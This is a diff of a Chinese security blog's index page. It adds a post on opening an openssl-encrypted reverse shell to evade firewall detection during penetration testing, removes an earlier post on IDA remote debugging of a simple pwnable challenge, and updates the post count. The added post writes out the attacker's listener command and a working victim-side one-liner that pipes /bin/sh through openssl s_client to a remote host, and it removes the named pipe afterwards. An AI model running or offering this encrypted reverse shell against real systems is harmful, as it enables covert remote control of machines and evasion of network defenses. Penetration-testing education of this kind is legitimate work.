@@ -258,6 +258,194 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/08/openssl加密反弹shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/07/08/openssl加密反弹shell/" itemprop="url">
+                  openssl加密反弹shell
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-08T19:54:10+08:00">
+                2020-07-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/07/08/openssl加密反弹shell/" class="leancloud_visitors" data-flag-title="openssl加密反弹shell">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试过程中，经常会遇到目标服务器有防火墙，能够识别进出站的恶意流量并阻止反弹shell执行，遇到这种情况一般我们采用分块传输，编码，畸形报文等各种手段绕过。本篇介绍一种更方便的方式：使用openssl加密传输。</p>
+<h2 id="攻击机操作"><a href="#攻击机操作" class="headerlink" title="攻击机操作"></a>攻击机操作</h2><p>攻击机生成密钥对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/openssl_shell/shell01.png" alt=""></p>
+<p>其中各参数：</p>
+<p>-new: 表示生成一个新的证书签署要求<br>-x509： 专用于生成CA自签证书<br>-key：指定生成证书用到的私钥文件<br>-out FILNAME：指定生成的证书的保存路径<br>-days：指定证书的有效期限，单位为day，默认是365天<br>-notes： 生成的私钥文件不会被加密</p>
+<p>攻击机监听端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</span><br></pre></td></tr></table></figure>
+<h2 id="靶机操作"><a href="#靶机操作" class="headerlink" title="靶机操作"></a>靶机操作</h2><p>靶机上反弹加密shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.xx.xx:4444 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/openssl_shell/shell02.png" alt=""></p>
+<p>mkfifo /tmp/s;创建一个管道</p>
+<p>/bin/sh -i &lt; /tmp/s 2&gt;&amp;1 打开一个交互式反弹shell，2&gt;&amp;1的意思是把标准错误输出重定向到标准输出，否则输入错误命令回显会显示在靶机中</p>
+<p>openssl s_client -quiet -connect 192.168.xx.xx:4444 &gt; /tmp/s; 解密流量，将攻击端输入的数据解密后反弹回攻击端</p>
+<p>rm /tmp/s 由于已经加载进内存，清除掉/tmp/s文件</p>
+<p>其中openssl各参数：</p>
+<p>-quiet：不打印出session和证书的信息。同时隐式打开-ign_eof<br>-ign_eof：当输入文件到达文件尾的时候并不断开连接<br>-connect host:port： 设置服务器地址和端口号。如果没有设置，则默认为本地主机以及端口号4433  </p>
+<h2 id="shell成功连接"><a href="#shell成功连接" class="headerlink" title="shell成功连接"></a>shell成功连接</h2><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/openssl_shell/shell03.png" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/12/正则表达式导致的redos问题/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2097,192 +2285,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/04/ida远程调试linux程序/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/02/04/ida远程调试linux程序/" itemprop="url">
-                  ida远程调试linux程序
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-04T00:26:16+08:00">
-                2020-02-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ida/" itemprop="url" rel="index">
-                    <span itemprop="name">ida</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/02/04/ida远程调试linux程序/" class="leancloud_visitors" data-flag-title="ida远程调试linux程序">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在分析二进制程序时，经常需要借助动态调试的方法，在linux中我们通常使用gdb来进行动态调试，但是gdb使用方法较复杂，对新手不友好，而ida具有很好的图形化界面，使用ida对linux程序进行远程动态调试在这种情况下是一种不错的选择。</p>
-<h2 id="ida远程调试配置"><a href="#ida远程调试配置" class="headerlink" title="ida远程调试配置"></a>ida远程调试配置</h2><p>1.要配置ida远程调试，首先需要将ida安装目录dbgsrv中的linux_server、linux_server64（根据所调试程序是32还是64位）拷贝至linux机器中。赋予其可执行权限，并运行对应版本的linux_server。</p>
-<p>2.将需要调试程序拷贝两份，一份放在linux中，赋予其others可执行权限（sudo chmod o+x xxx），另一份放在windows中，使用ida打开，并选择在上方菜单栏选择Debuger-&gt;Run-&gt;Remote Linux Debugger。</p>
-<p>3.在Debugger-&gt;process options中配置远程linux机器ip，端口，运行文件路径，以及运行参数等。点击ok，ida自动载入远程程序，ida远程调试的配置就完成了。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida01.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida02.png" alt=""></p>
-<h2 id="ida远程调试"><a href="#ida远程调试" class="headerlink" title="ida远程调试"></a>ida远程调试</h2><p>在本文中使用一道pwnable中的简单题目来讲解ida远程调试,先贴题目代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">        unsigned int random;</span><br><span class="line">        random = rand();        // random value!</span><br><span class="line"></span><br><span class="line">        unsigned int key=0;</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;key);</span><br><span class="line"></span><br><span class="line">        if( (key ^ random) == 0xdeadbeef )&#123;</span><br><span class="line">                printf(&quot;Good!\n&quot;);</span><br><span class="line">                system(&quot;/bin/cat flag&quot;);</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        printf(&quot;Wrong, maybe you should try 2^32 cases.\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>本题原意是考察c语言中rand()函数在不使用随机数种子的情况下，默认使用1作为种子，导致每次产生的随机数均为同样的值，只需要将代码重新编译运行print出随机数即可，或者动态调试时候直接查看内存中随机数的值，此处为了介绍ida远程调试，就使用第二种办法。</p>
-<p>1.首先我们在刚才的程序中，找到主函数，F5反编译伪代码，F2设置断点，并启动远程调试。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida03.png" alt=""></p>
-<p>2.打开debugger-&gt;debugger windows-&gt;watch view监视窗口，添加新变量v5进行观察，或者直接在汇编中，添加eax查看调用rand函数之后的值。</p>
-<p>3.F8单步调试，F9单步进入函数，多次按下F8在rand()之后查看v5或rand之后eax的值，计算和0xdeadbeef的异或就是需要输入的key值。在这里得到，随机数为0x6B8B4567，则计算得到key为0xb526fb88，由于需要输入%d格式的key，所以转换成十进制为3039230856。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida04.png" alt=""></p>
-<p>4.linux中输入计算值，进入分支，获取flag。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida05.png" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2332,7 +2334,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">101</span>
+                <span class="site-state-item-count">102</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
